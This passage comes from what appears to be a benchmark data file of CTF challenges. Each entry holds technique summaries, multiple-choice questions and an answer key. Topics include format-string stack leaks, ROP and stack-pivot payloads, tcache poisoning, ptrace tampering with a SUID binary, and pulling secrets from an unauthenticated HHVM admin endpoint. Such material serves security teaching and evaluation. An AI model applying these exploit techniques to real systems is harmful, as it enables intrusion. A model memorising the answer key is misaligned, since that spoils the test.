        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When participating in a CTF challenge that involves reviewing website content or rules, a direct inspection of the website's source code can reveal hidden flags or clues. Specifically, using browser functionalities such as 'Inspect Element' or 'View Page Source' can uncover elements not immediately visible on the page's surface. This method is particularly useful when the challenge hints suggest that the flag is embedded or hidden within the website itself.",
            "Clues or flags hidden in a CTF challenge's instructional or informational text often require attention to detail. In challenges where participants are advised to follow specific instructions or read through provided material, it is crucial to scrutinize every part of the text, including titles, footnotes, and seemingly inconsequential sections, as organizers may embed hints or flags directly within these texts."
        ],
        "question": [
            "In a web-based CTF challenge, which browser feature should be used to uncover possible hidden flags within the webpage's underlying code when the challenge hints that inspecting the webpage might be beneficial? - A. Use the browser's \"Forward\" button to navigate through previously visited pages. - B. Utilize browser plugins specifically designed to detect changes in website content. - C. Employ the 'Inspect Element' or 'View Page Source' feature of a web browser to examine the webpage's source code directly. - D. Search the website's URL in search engines with the hope of finding related pages with the flag.",
            "When a CTF challenge involves reading through guidelines or rules with a hint that a close examination could reveal a flag, what approach is essential for participants to adopt? - A. Skimming through the text quickly to cover as much ground as possible in the least amount of time. - B. Focusing exclusively on the main body of text while ignoring titles, footnotes, or ancillary sections. - C. Paying careful attention to every part of the text, including titles, footnotes, and sections that might initially seem irrelevant, as the flag may be hidden within these areas. - D. Ignoring the textual content and focusing solely on any accompanying images or media for hidden clues."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "readflag",
        "write_up": "dataset/raw/readflag.md",
        "type": "misc",
        "competition": [
            "PBjar/2021",
            "https://ctftime.org/event/1430/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In scenarios where a binary performs XOR operations on sensitive data using unpredictable data from a source like `/dev/urandom`, and direct reading of the binary's memory is not permitted due to filesystem permissions or security mechanisms, analyzing the behavior of system calls through `ptrace` with specific actions like `PTRACE_SYSCALL`, `PTRACE_GETREGS`, and `PTRACE_SETREGS` can be effective. By intercepting and modifying the syscall responsible for reading the unpredictable data (e.g., replacing the syscall number with an invalid one), you can control or bypass the randomness and extract the sensitive information in a predictable manner.",
            "When dealing with binaries that have the SUID bit set, traditional methods of environment manipulation, such as using `LD_PRELOAD` to inject custom behaviors, are typically neutralized for security reasons. In these cases, employing debugging and syscall tracing techniques with `ptrace` can be a viable alternative approach to manipulate or observe the binary's runtime execution. This approach allows for manipulation of the binary's behavior or extraction of data without needing write or read access to the binary file itself, as demonstrated by modifying the behavior of system calls during execution to bypass randomness sources or alter execution flow."
        ],
        "question": [
            "In a given scenario where a binary encrypted its output with XOR, using `ptrace` to intercept and modify syscall behavior for extracting sensitive information, which of the following actions is correct for making the output of a program predictable by intercepting its read operation from `/dev/urandom`? - A. Modify the syscall to skip only write operations to the standard output. - B. Change the `regs.orig_rax` to an invalid value so the read syscall fails but manually set a successful return value. - C. Directly modify the binary content in memory to remove the XOR operation. - D. Use `ptrace` to continuously modify the binary\u2019s execution flow to avoid calling any syscall. ",
            "When attempting to interact with a binary that has the SUID bit set and uses `/dev/urandom` for generating randomness, which of the following statements is true regarding the use of `ptrace` to bypass environment variable restrictions like `LD_PRELOAD`? - A. `ptrace` allows for the execution of additional files as part of the binary process, making `LD_PRELOAD` unnecessary. - B. `ptrace` can be employed to direct alter environment variables at runtime, including `LD_PRELOAD`. - C. Using `ptrace`, one can inject custom behavior by directly modifying memory addresses where environment variables are stored. - D. `ptrace` can manipulate the binary's system call requests and responses, bypassing the need for environment variable modifications such as `LD_PRELOAD`. "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Readme",
        "write_up": "dataset/raw/Readme.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "In challenges involving format string vulnerabilities, if user input is directly passed to functions like `printf` without sanitization, we can leverage this to read values from the stack. By utilizing format specifiers such as `%p` along with `%<offset>$p`, we can extract information from specific stack locations. This technique is particularly useful for leaking memory addresses or other sensitive information stored in the stack.   \nExample payload: `%1$p`",
            "To systematically siphon data from a vulnerable application's memory, you can iteratively adjust the format string payload to read successive memory addresses. This process can be automated within a script by dynamically building payloads to leak more data with each request. Such scripts can be enhanced post-CTF for more efficient memory dumping by structuring format strings to fill the buffer capacity in each request, thereby reducing the number of needed interactions with the application.  \nExample improvement: Automating the payload generation to optimize the number of requests by concatenating multiple format specifiers until the buffer limit is reached, then sending the payload, and parsing leaked memory for valuable data."
        ],
        "question": [
            "When exploiting a format string vulnerability, which format specifier is correctly used to read and leak addresses from the stack when the user input is directly passed to `printf` in a C program?  - A. `%d` - B. `%s` - C. `%p` - D. `%x` ",
            "In the context of improving a script for more efficient memory dumps after identifying a format string vulnerability in a binary application, what is the primary method to optimize data extraction?  - A. Reducing the size of each payload to leak fewer bytes per request. - B. Adding delays between each request to avoid detection. - C. Concatenating multiple format specifiers until reaching the buffer limit before sending the payload. - D. Encrypting payloads before sending to improve security. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "ready, bounce, pwn!",
        "write_up": "dataset/raw/ready, bounce, pwn!.md",
        "type": "pwn",
        "competition": [
            "DownUnderCTF/2021",
            "https://ctftime.org/event/1312/tasks/"
        ],
        "score": 436,
        "max_score": 494,
        "difficulty": 0.8825910931174089,
        "knowledge": [
            "In a scenario involving a stack pivot due to a controlled addition to the `rbp` register, if there's a limit to the payload size for a ROP chain, use smaller, strategic ROP gadgets to manipulate the stack and execute multiple stages of an attack. This can involve using gadgets to modify the stack pointer (`rsp`) directly or indirectly to execute different parts of the payload that couldn't fit into a single upload due to size constraints.\n   - Example approach: Leverage gadgets to manipulate `rsp` to execute sequential parts of a ROP chain, utilizing smaller chunks of payloads to eventually leak libc addresses, loop back to the beginning of the vulnerable function, and finally execute a crafted payload for a shell.",
            "In challenges with stack execution prevention (NX bit enabled) and a limited buffer overflow vulnerability not directly allowing for shellcode execution or when facing restrictions in payload size, pivoting the stack to execute pre-planned ROP chains in multiple stages allows for executing complex attacks in limited space.\n   - Example approach: Employ a small payload to leak a libc address by first pivoting the stack to the payload, then using known offsets to call further gadgets or functions (like `puts` to leak an address), and in a subsequent stage, adjusting the stack again to execute system calls or other desired functionality with newfound libc address calculations."
        ],
        "question": [
            "When executing a multi-stage ROP attack due to payload size constraints, which technique is essential for success? - A. Overwriting the return address with a brute force method to directly jump to the system call. - B. Executing a long NOP sled to slide into the ROP chain within a single payload delivery. - C. Using strategic gadgets to manipulate `rsp` or other registers for sequential execution of different payload parts. - D. Increasing the payload size by exploiting a separate buffer overflow vulnerability to fit the entire ROP chain in one go.",
            "Given an environment where the stack execution is disabled (NX bit enabled) and the payload space is extremely limited, what method can be efficiently leveraged to achieve arbitrary code execution? - A. Directly embedding shellcode within the environment variables and jumping to that location. - B. Utilizing a stack pivot and carefully selected ROP gadgets to perform a leak and then execute system calls with libc addresses. - C. Creating a separate thread within the application to increase the available buffer space for the payload. - D. Encrypting the payload to bypass the size restrictions and then decrypting it in memory."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "real ECC",
        "write_up": "dataset/raw/real ECC.md",
        "type": "crypto",
        "competition": [
            "Chujowy/2020",
            "https://ctftime.org/event/1087/tasks/"
        ],
        "score": 470,
        "max_score": 500,
        "difficulty": 0.94,
        "knowledge": [
            "When solving discrete logarithm problems with elliptic curve cryptography (ECC) where the curve parameters are unknown, one approach is to analyze the given point addition law to deduce unique properties of the curve or operations. Specifically, one can attempt to simplify the operations into forms that enable the use of discrete logarithm solution techniques, such as the Pohlig-Hellman algorithm, especially when the curve's underlying field characteristic is smooth. This approach hinges on finding a mapping from the curve's point addition law to a simplified algebraic form that can be directly solved using known discrete log algorithms.",
            "In scenarios involving encryption schemes that rely on ECC, and where the encryption operation involves XORing plaintext with a shared ECC-derived secret, recovering the shared secret through curve analysis and discrete logarithm techniques enables decryption of messages. This can be achieved by first identifying a mathematical relationship that simplifies the ECC point operations into a form that is susceptible to discrete log attacks, and then using the discovered secret to reverse the encryption. Once the shared secret is obtained, it can be used to decrypt the message by XORing it with the encrypted content. This method is applicable in situations where the ECC operations do not conform to standard curve equations and where direct information about the curve is not provided.  \n\nExample payload (from the implementation section to demonstrate decryption with the obtained shared secret):  \n```python\nsecret = mul(FF, A, b_s)  # Calculate the shared secret using the derived discrete log\ns = secret[0] * secret[1]  # Combine the calculated components to form the decryption key\n\nprint(long_to_bytes(Integer(enc)^^Integer(s)))  # Decrypt the message by XORing with the shared secret\n```"
        ],
        "question": [
            "In the context of ECC where curve parameters are not provided, and you're solving for a discrete logarithm by examining the point addition law, which of the following simplifications could potentially facilitate the application of discrete logarithm solution techniques like Pohlig-Hellman, especially in cases where the field characteristic is smooth?  - A. Transforming the point addition law into an operation involving matrix multiplication. - B. Simplifying point addition law to reveal a direct relationship between point doubling and the scalar multiplication operation. - C. Converting the point addition and doubling formulas into a series of bit manipulation operations. - D. Finding an algebraic simplification that directly represents the addition of two points in terms of polynomial additions. ",
            "When faced with an encryption process that XORs plaintext with a shared secret derived from an ECC operation, and given that the curve's specifics are not directly provided, what is the critical step that enables decryption of the ciphertext?  - A. Utilizing an RSA decryption technique on the XORed output to uncover the message. - B. Applying a hash function to the shared secret before XORing it with the ciphertext. - C. Converting the ECC-derived shared secret into an ASCII string and directly comparing it with the ciphertext. - D. Recovering the shared secret through curve analysis and using it to reverse the XOR operation on the ciphertext. "
        ],
        "answer": [
            "B",
            "D"
        ]
    },
    {
        "name": "Real Mersenne",
        "write_up": "dataset/raw/Real Mersenne.md",
        "type": "crypto",
        "competition": [
            "Zh3r0/2021",
            "https://ctftime.org/event/1285/tasks/"
        ],
        "score": 949,
        "max_score": 997,
        "difficulty": 0.9518555667001003,
        "knowledge": [
            "To predict future outputs of Python's `random.random()` when it uses a Mersenne Twister (MT) as its PRNG, one must extract a sufficient number of actual bits from the MT's output to deduce its internal state. This can be achieved by understanding the implementation detail that Python's `random.random()` function generates its floating-point numbers by shifting and combining bits from two consecutive `genrand_uint32()` calls from the MT. The specific operation is to shift the first 32-bit output right by 5 bits (discarding the lowest 5 bits) and the second 32-bit output right by 6 bits (discarding the lowest 6 bits), then combining these to form the fractional part of the floating-point number.",
            "After gathering the requisite number of bit sequences from the MT's outputs, one can utilize tools like Z3 with a script designed for the symbolic execution of Mersenne Twister to recover the PRNG's internal state. This makes it possible to predict subsequent outputs. The scripts or tools designed for this purpose often require submitting truncated outputs in a specific format, accommodating the circumstances of having partial information about the generated numbers. This approach is based on the principle that after observing 624 outputs from the Mersenne Twister, one can theoretically solve for its initial seed and predict future outputs, which is critical for challenges that involve predicting PRNG outputs.\n\nSample of Z3 solver usage (Python code snippet):\n```python\nfrom z3 import *\n\n# Assuming `a` and `b` are obtained bit sequences as strings where known bits are represented literally and unknown bits by '?'\na, b = \"11001010????????11001010????????\" , \"110010??????????1100101?????????\"\n\n# Initialize the untwister and submit `a` and `b`. Specific implementation details may vary.\nut = Untwister()\nut.submit(a)\nut.submit(b)\n# Trigger the solving process\ntry:\n    ut.solve()\n    print(\"Seed found:\", ut.get_seed())\nexcept Exception as e:\n    print(\"Failed to find the seed:\", str(e))\n```\nThis pseudo-code demonstrates how to interact with a hypothetical untwister object, which represents a solver that can handle the recovery of Mersenne Twister's internal state from partial outputs. Actual implementations require adjusting the code to match the specific API and behavior of the used untwister tool."
        ],
        "question": [
            "In a scenario where you are attempting to predict the output of Python's `random.random()` function, which utilizes the Mersenne Twister as its pseudo-random number generator (PRNG), understanding the internal mechanism of output generation is crucial. Given the following Python code snippet that mimics the `random.random()` implementation: ```c uint32_t a = genrand_uint32() >> 5, b = genrand_uint32() >> 6; double result = (a * 67108864.0 + b) * (1.0 / 9007199254740992.0); ``` If you had a floating-point number `result`, which technique would allow you to recover the values of `a` and `b` used in its calculation? - A. Multiply `result` by 9007199254740992.0 and use the integer part as `a` and remainder as `b`. - B. Directly compare `result` to known outputs of `genrand_uint32()` until a match is found. - C. Convert `result` to a binary format and extract `a` and `b` from specific bit positions. - D. Shift `result` by 26 bits to recover `a` and perform a bitwise AND with `0x3ffffff` to recover `b`. ",
            "When utilizing a Z3-based solver to recover the internal state of a Mersenne Twister based on known bits from its output, which of the following represents the correct approach to prepare data for the solver? - A. Convert all known output bits directly into decimal format and submit them in sequence without any modification. - B. Submit known bits as binary strings, where known bits are represented by their actual value and unknown bits by a symbol like `?`, indicating uncertainty. - C. Encode the entire sequence of bits into a hexadecimal string, regardless of knowing specific bits, and submit this to the solver without distinguishing between known and unknown bits. - D. Summarize the known bits into a series of integers that describe the count of consecutive known or unknown bits and submit this summary. "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "reality",
        "write_up": "dataset/raw/reality.md",
        "type": "pwn",
        "competition": [
            "GoogleCTF/2019/Quals",
            "https://ctftime.org/event/809/tasks/"
        ],
        "score": 279,
        "max_score": 500,
        "difficulty": 0.558,
        "knowledge": [
            "When dealing with a binary exploitation CTF challenge, employing the Return Oriented Programming (ROP) technique can be effective for constructing an exploit, particularly when direct execution of shellcode is prevented. ROP works by finding and utilizing instructions already present in the binary's code (gadgets) to execute arbitrary operations. This is often used to circumvent protections such as non-executable stack (NX) or Data Execution Prevention (DEP).\n    - Example payload component: `rop.chain()`",
            "In scenarios requiring interaction with a remote service to exploit a binary, leveraging a combination of local debugging and remote execution can streamline the development of the exploit. Tools like `pwntools` can be used to switch between local debugging, local execution, and remote execution by changing arguments. This facilitates testing the exploit in a controlled environment before deploying it against the target remote service.\n    - Example for switching between local and remote: \n        - Use `args.GDB` for local debugging with GDB.\n        - Use `args.REMOTE` for connecting to the remote service.\n        - Use `args.LOCAL` for local testing without debugging symbols."
        ],
        "question": [
            "In a binary exploitation challenge that utilizes Return Oriented Programming (ROP) to bypass Data Execution Prevention (DEP), which line in the given code example assembles the ROP chain that will be injected into the vulnerable program? - A. `rop.one()` - B. `rop.three(0xdeadbeef, 0x0000ffff, 123)` - C. `payload = cyclic(44)` - D. `payload += rop.chain()`",
            "When switching exploit testing modes using `pwntools` based on the given scenario, which argument enables debug mode with GDB during local execution, allowing for breakpoints and stepping through the code? - A. `args.LOCAL` - B. `args.REMOTE` - C. `args.GDB` - D. `payload += rop.chain()`"
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Really Speedy Algorithm",
        "write_up": "dataset/raw/Really Speedy Algorithm.md",
        "type": "crypto",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 350,
        "max_score": 700,
        "difficulty": 0.5,
        "knowledge": [
            "For RSA-based CTF challenges, when given **p, q,** and **e** (RSA public key parts), it's crucial to understand how to compute **d** (the private key), as **d** is the modular multiplicative inverse of **e** modulo **phi(n)**, where **phi(n)** is Euler's totient function calculated as **(p-1)*(q-1)**. This process is essential for decrypting messages or signatures encrypted with the public key.  \n**Python example:**  \n```python\ndef modinv(a, m):\n    g, x, y = egcd(a, m)\n    if g != 1:\n        raise Exception('modular inverse does not exist')\n    return x % m\n    \ndef find_d(p, q, e):\n    phi = (p - 1) * (q - 1)\n    d = modinv(e, phi)\n    return d\n```",
            "For challenges involving RSA operations, if the task is to find the original plaintext (**pt**) given **p, q (or phi), e,** and the ciphertext (**ct**), or to generate ciphertext given the plaintext, the RSA encryption and decryption formulas can be applied directly. For encryption, use **ct = pt^e mod n**. For decryption or recovering the plaintext, calculate **d** as outlined in point 1, then apply **pt = ct^d mod n**. These operations rely on the core RSA property where **n = p * q** and **phi(n) = (p-1) * (q-1)**.  \n**Python example for finding plaintext (pt):**  \n```python\ndef find_pt(p, q, e, ct):\n    n = p * q\n    phi = (p - 1) * (q - 1)\n    d = modinv(e, phi)  # Use the modinv function as described in point 1\n    pt = pow(ct, d, n)\n    return pt\n```"
        ],
        "question": [
            "In an RSA encryption challenge, you need to compute the private key component **d** given the prime numbers **p**, **q**, and the public exponent **e**. Given that **d** is calculated as the modular multiplicative inverse of **e** modulo **phi(n)**, where **phi(n) = (p-1)*(q-1)**, which Python function below correctly implements this process?  - A. `def find_d(p, q, e): return (e ** -1) % ((p - 1) * (q - 1))` - B. `def find_d(p, q, e): phi = (p - 1) * (q - 1); return pow(e, -1, phi)` - C. `def find_d(p, q, e): return e % ((p - 1) * (q - 1))` - D. `def find_d(p, q, e): phi = (p - 1) * (q - 1); d = modinv(e, phi); return d` ",
            "When given **p**, **q** (or **phi**), **e**, and ciphertext (**ct**) in an RSA-based task, and asked to find the original plaintext (**pt**), which of the following Python functions correctly uses RSA decryption principles, including the modular inverse function **modinv(a, m)** from the provided RSA decryption example?  - A. `def find_pt(p, q, e, ct): n = p * q; pt = ct ** e % n; return pt` - B. `def find_pt(p, q, e, ct): d = (e ** -1) % (p - 1) * (q - 1); n = p * q; pt = pow(ct, d, n); return pt` - C. `def find_pt(p, q, e, ct): n = p * q; phi = (p - 1) * (q - 1); d = modinv(e, phi); pt = pow(ct, d, n); return pt` - D. `def find_pt(p, q, e, ct): return ct` "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "really_obnoxious_problem",
        "write_up": "dataset/raw/really_obnoxious_problem.md",
        "type": "pwn",
        "competition": [
            "angstrom/2022",
            "https://ctftime.org/event/1588/tasks/"
        ],
        "score": 140,
        "max_score": 250,
        "difficulty": 0.56,
        "knowledge": [
            "In a challenge that requires exploitation through a buffer overflow to execute a specific function that takes arguments, it's crucial to understand the calling convention used by the program, especially for functions that require multiple arguments. In the case of 64-bit ELF binaries on Linux, the first few function arguments are passed via registers (rdi, rsi, rdx, rcx, r8, and r9). To control these registers, one must find or craft specific gadgets (sequences of instructions ending with `ret`) that pop values into them. Usually, `pop rdi; ret;` and `pop rsi; pop r15; ret;` gadgets are sought after for setting up the first and second arguments respectively. The `ret2win` technique involves crafting a payload that overflows the buffer and sets up the stack in such a way that it directs execution flow to these gadgets and subsequently to the target function with the desired arguments.",
            "When dealing with binary exploitation challenges, it's important to send payloads in the correct format and order, taking into account the program's input methods and execution flow. This includes crafting payloads that include the addresses of gadgets, followed by the argument values they are meant to place in registers, and finally the address of the function to be executed. In doing so, one must also consider any offsets to reach the return address on the stack, which is typically filled with a buffer overflow. The use of tools like `pwntools` can greatly simplify the creation and sending of these payloads, allowing for automatically packing addresses in the correct format and sending them after triggering prompts or specific input requests from the vulnerable program.\n\nExample payload (applicable to the provided scenario):\n```python\npayload = flat({\n    offset: [\n        pop_rdi,\n        0x1337,  # Argument to be placed in RDI\n        pop_rsi_r15,\n        exe.sym.name,  # Argument to be placed in RSI\n        0x0,  # Value to fill R15, often a dummy value due to the double pop gadget\n        exe.functions.flag  # Address of the 'flag' function or target function to call\n    ]\n})\n```"
        ],
        "question": [
            "In the context of exploiting a 64-bit ELF binary by leveraging a buffer overflow to execute a function requiring arguments, which of the following gadgets are necessary to control the first two function arguments respectively? - A. `mov rdi, rsi; ret;` and `pop rcx; pop rdx; ret;` - B. `pop rsi; pop r15; ret;` and `pop rdi; ret;` - C. `pop rdi; ret;` and `pop rsi; pop r15; ret;` - D. `xor rdi, rdi; ret;` and `xor rsi, rsi; ret;`",
            "When constructing a payload for a binary exploitation attack involving a buffer overflow, what sequence best represents the correct payload structure to execute a function with arguments using `pwntools`? - A. `[exe.functions.flag, pop_rdi, 0x1337, pop_rsi_r15, exe.sym.name, 0x0]` - B. `[pop_rdi, exe.functions.flag, 0x1337, exe.sym.name, pop_rsi_r15, 0x0]` - C. `[offset, pop_rdi, 0x1337, pop_rsi_r15, exe.sym.name, 0x0, exe.functions.flag]` - D. `[offset, pop_rdi, 0x1337, exe.sym.name, pop_rsi_r15, 0x0, exe.functions.flag]`"
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "real_ec",
        "write_up": "dataset/raw/real_ec.md",
        "type": "pwn",
        "competition": [
            "Pwn2Win/2019",
            "https://ctftime.org/event/822/tasks/"
        ],
        "score": 363,
        "max_score": 500,
        "difficulty": 0.726,
        "knowledge": [
            "When dealing with the task of reversing cryptographic operations within a domain that cannot be efficiently broken, such as ECDSA with well-established curves like P256, a feasible strategy under constrained conditions involves leveraging brute-force techniques in creative ways. Specifically, for challenges where the cryptographic operation involves unknown coefficients applied to known values or operations (e.g., scalar multiplication in elliptic curves), employing a meet-in-the-middle strategy can significantly reduce the computational effort. This approach requires creating a lookup table for a portion of the computation (up to k bits of the operation) and then conducting a brute-force search for the remaining bits (40-k bits in the provided scenario) in parallel, balancing the search space against available computational resources.",
            "Optimizing brute-force search under tightly constrained time frames, particularly in cryptographic contexts where operations like point multiplication on elliptic curves are involved, can benefit from precomputing inverses of possible coefficients (in this case, the unknown *n*) and exploring algebraic properties of the operation (e.g., utilizing addition of points instead of multiplication for speedup). This requires an understanding of the underlying mathematical operations and the ability to parallelize the lookup process efficiently across available hardware resources, such as using servers with a high number of cores. In scenarios with extremely large datasets (several terabytes in size) that make direct brute-force infeasible, this combined approach of meet-in-the-middle with computational optimizations and parallel processing enables the handling of otherwise intractable problems within practical time limits.\n\nExample of optimization in elliptic curve operations:\nAssuming a scenario where point addition is faster than point multiplication, one could implement a variant of the double-and-add algorithm for elliptic curves that focuses on maximizing the use of point addition operations over point multiplication wherever possible. Unfortunately, without specific code or parameters, providing a direct \"payload\" or command example is not applicable, but the emphasis lies in algorithmic optimization based on cryptographic properties."
        ],
        "question": [
            "In a cryptographic challenge involving the elliptic curve P256, where the goal is to find a hash of a secret split into 250 32-bit integers followed by operations with unknown coefficients, a critical strategy is to manage the computational work efficiently due to the impracticality of directly breaking ECDSA. Given the scenario where the effective computation involves scalar multiplication with elliptic curve points and unknown coefficients, which approach is best suited to reduce the computational effort? - A. Rely solely on the brute force search for all possible coefficients without any optimization. - B. Employ a meet-in-the-middle strategy by creating a lookup table for up to k bits of the operation and then conducting a brute-force search for the remaining bits in parallel. - C. Attempt to decrypt the secret directly using conventional decryption algorithms without leveraging elliptic curve properties. - D. Increase the computational power by using quantum computing to directly solve for the coefficients.",
            "When optimizing a brute-force search for cryptographic operations within a limited time frame, specifically for challenges involving elliptic curve point multiplications under P256 curve, which optimization techniques can significantly enhance the efficiency of solving the problem? - A. Utilizing a single-core processor to linearly compute point multiplications without precomputations. - B. Implement an algorithm that focuses exclusively on optimizing server storage requirements, ignoring computational speed. - C. Precompute inverses of possible unknown coefficients and employ point addition operations instead of multiplication, leveraging parallel processing across servers with a high number of cores. - D. Avoid any precomputations or parallel processing to ensure the integrity of the cryptographic operations remains uncompromised."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "REdo 2",
        "write_up": "dataset/raw/REdo 2.md",
        "type": "reverse",
        "competition": [
            "TAMUctf/2022",
            "https://ctftime.org/event/1557/tasks/"
        ],
        "score": 152,
        "max_score": 500,
        "difficulty": 0.304,
        "knowledge": [
            "When reverse engineering assembly code challenges in CTFs, converting the assembly code to a more readable format like Pseudo-C can simplify understanding the logic and identifying the algorithm or checks being performed. To convert assembly code written in AT&T syntax to Intel syntax, which might be more familiar to many, add `.intel_syntax noprefix` at the top of the assembly file before assembling it. This approach is useful in cases where disassemblers like Binary Ninja or Ghidra are used to automate the reverse engineering process. This can aid significantly in understanding the flow and operations of the program, making it easier to craft a solver or identify vulnerabilities.",
            "In challenges involving string manipulation or conditional checks where characters of a flag or input are being modified in a loop, it's possible to reverse the logic by setting up a Python script to replicate the operations performed by the assembly code. If the challenge involves operations like adding or subtracting from ASCII values, shifting characters, or conditional checks against specific values, these can be translated into Python expressions and loops to methodically reconstruct the flag or input string. This approach requires identifying loops and conditions in the disassembled code that manipulate data, then mirroring those operations in a high-level language like Python. This strategy allows for a systematic approach to solving reverse engineering challenges focused on string manipulation. \n\nExample Python snippet based on the extracted logic:\n```python\nflag = [0]*39  # Adjust size accordingly based on the challenge\n# Sample operations translated from the assembly logic to Python\nflag[0x1] = 0x38 + 0x31  # Example of adjusting ASCII values\nflag[0x0] = 0x36 + 0x31\n# Replicate operations such as shifts or character replacements as seen in assembly\n# Example loop mirroring assembly operations\nfor o in range(0, 3):  \n    for k in range(0, 4):  \n        for j in range(0, 5):  \n            flag[j + 0xf] = 0x32 + 0x31  \n        flag[k + 0xa] = 0x31 + 0x31  \n    flag[o + 0x6] = 0x30 + 0x31\n# Convert the numeric values back to characters to form the flag\nprint(''.join(map(chr, flag)))\n```\nThis script simplifies the reverse engineering process by mirroring the logic found in the disassembly, adjusting for any transformations applied to the data within the program, and reconstructing the potentially manipulated string or flag."
        ],
        "question": [
            "When converting assembly code from AT&T syntax to Intel syntax in a reverse engineering challenge, which directive should be added at the top of the assembly file before assembling it to make it more readable with disassemblers like Binary Ninja or Ghidra? - A. `.att_syntax prefix` - B. `.syntax_conversion enable` - C. `.intel_syntax noprefix` - D. `.convert_to_intel` ",
            "In a reverse engineering challenge focused on string manipulation, if an assembly code segment subtracts `0x31` from each character of a string in a loop, how should this operation be mirrored in a Python script aiming to reconstruct the original string? - A. `flag[i] = flag[i] + 0x31 for i in range(len(flag))` - B. `for i in range(0, 39): flag[i] -= 0x30` - C. `flag[i] = flag[i] ^ 0x31 for i in range(len(flag))` - D. `for i in range(len(flag)): flag[i] *= 0x31` "
        ],
        "answer": [
            "C",
            "A"
        ]
    },
    {
        "name": "refcnt",
        "write_up": "dataset/raw/refcnt.md",
        "type": "pwn",
        "competition": [
            "ASIS/2020/Finals",
            "https://ctftime.org/event/1111/tasks/"
        ],
        "score": 159,
        "max_score": 500,
        "difficulty": 0.318,
        "knowledge": [
            "When exploiting a use-after-free vulnerability, manipulating the program's control flow to copy the same index onto itself can trigger the vulnerability, allowing for heap address leakage. This technique can be further exploited to perform arbitrary actions such as File Structure Oriented Programming (FSOP) by compromising the heap's integrity.\n   ```\n   add(1, 0x10)\n   copy(1, 1)\n   show(1) # Triggers use-after-free, leaking heap address\n   ```",
            "Tcache poisoning can be achieved by carefully crafting heap operations to manipulate the tcache's linked list. By overwriting a freed chunk's metadata, such as the `tcache->key`, it's possible to perform a double-free without detection by libc's security checks (applicable to libc version 2.31, which has protections against tcache double frees). This method allows for the creation of overlapped chunks, enabling arbitrary write operations through controlled use of the tcache.\n   ```\n   add(1, 0x10)\n   copy(1, 1)\n   edit(1, p64(heap_base+0x100)) # Overwrites tcache->key\n   copy(1, 1) # Performs tcache double free, incrementing tcache->next\n   copy(1, 2) # Further manipulates tcache->next\n   ```"
        ],
        "question": [
            "In the context of exploiting a use-after-free vulnerability, what action can lead to the triggering of this vulnerability, specifically in scenarios where manipulating a program's control items is critical? - A. Allocating a new object immediately after freeing the old one, without any intermediate action. - B. Freeing an object twice in a row without any intervening allocations or modifications. - C. Copying the same index onto itself in a notepad-like application, causing the application to use freed memory. - D. Editing an object without properly allocating memory for it, leading to undefined behavior. ",
            "When attempting to circumvent libc's security checks against tcache double free in a version like libc 2.31, what technique is correct for achieving tcache poisoning and enabling the creation of overlapped chunks? - A. Using the malloc() function to directly allocate memory chunks without freeing any, to avoid tcache checks. - B. Overwriting a freed chunk's `tcache->key` with specific data to manipulate the tcache's linked list, allowing a double-free without detection. - C. Incrementing the reference count of a free chunk without modifying its metadata, to bypass security checks. - D. Allocating large chunks of memory to overflow the tcache bins, forcing the allocator to service requests from the global pool. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Regexicide",
        "write_up": "dataset/raw/Regexicide.md",
        "type": "web",
        "competition": [
            "FacebookCTF/2019",
            "https://ctftime.org/event/781/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When confronting a challenge involving a server with HHVM (HipHop Virtual Machine), and if admin functions are exposed and unauthenticated, exploring provided admin functionalities like `/static-strings`, `/dump-static-strings`, or `/random-static-strings` can lead to sensitive data exposure. This is particularly useful in situations where the server stores static strings that may include secrets or flags.",
            "In the scenario where the application exposes an endpoint that allows extracting static strings, leveraging parameters such as `count` to control the number of strings returned can optimize the retrieval of all static strings, potentially including secret keys or flags. Example payload for retrieving static strings in bulk might be: `http://<target-host>:<port>/random-static-strings?count=1000`. This approach is preferable to brute-forcing or manually querying for strings as it minimizes requests and maximizes efficiency in flag extraction."
        ],
        "question": [
            "When attempting to exploit an unauthenticated HHVM admin server for potential sensitive data exposure, which of the following actions is most effective? - A. Utilizing the `/dump-static-strings` endpoint to write static strings to a server file and then examine that file. - B. Submitting a POST request to `/static-strings-rds` with a JSON payload to retrieve defined constants. - C. Engaging in brute force attacks against the server to bypass authentication mechanisms. - D. Directly modifying server configuration files to gain admin access.",
            "In the context of exploiting an endpoint that returns static strings, how can the efficiency of extracting all static strings, including potential secrets or flags, be maximized? - A. Sending multiple simultaneous GET requests to `/static-strings` without specifying parameters to cause a server overload. - B. Applying the `count` parameter with a high value in a GET request to `/random-static-strings` for bulk retrieval of strings. - C. Crafting a sophisticated SQL injection attack to bypass the need for using the exposed endpoint. - D. Employing a network scanning tool to automatically discover and interact with the `/random-static-strings` endpoint."
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "regulus-satrapa",
        "write_up": "dataset/raw/regulus-satrapa.md",
        "type": "crypto",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 447,
        "max_score": 493,
        "difficulty": 0.9066937119675457,
        "knowledge": [
